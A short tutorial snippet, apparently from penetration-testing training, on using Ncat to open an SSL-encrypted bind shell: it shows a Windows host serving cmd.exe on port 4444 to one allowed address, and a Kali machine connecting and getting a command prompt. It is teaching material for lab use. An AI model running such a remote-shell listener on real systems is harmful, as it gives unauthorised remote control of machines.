# Ncat

* set up an SSL encrypted connection on port 4444 and allow only 10.0.0.4 to connect to it

```
  C:\Users\offsec>ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
    Ncat: Version 5.59BETA1 ( http://nmap.org/ncat )
    Ncat: Generating a temporary 1024-bit RSA key.
    Ncat: SHA-1 fingerprint: 1FC9 A338 0B1F 4AE5 897A 375F 404E 8CB1 12FA DB94 Ncat: Listening on 0.0.0.0:4444
    Ncat: Connection from 10.0.0.4:43500.
```

```
  root@kali:~# ncat -v 10.0.0.22 4444 --ssl
    Ncat: Version 6.25 ( http://nmap.org/ncat )
    Ncat: SSL connection to 10.0.0.22:4444.
    Ncat: SHA-1 fingerprint: 1FC9 A338 0B1F 4AE5 897A 375F 404E 8CB1 12FA DB94 Microsoft Windows [Version 6.1.7600]
    Copyright (c) 2009 Microsoft Corporation. All rights reserved.
    C:\Users\offsec>
```
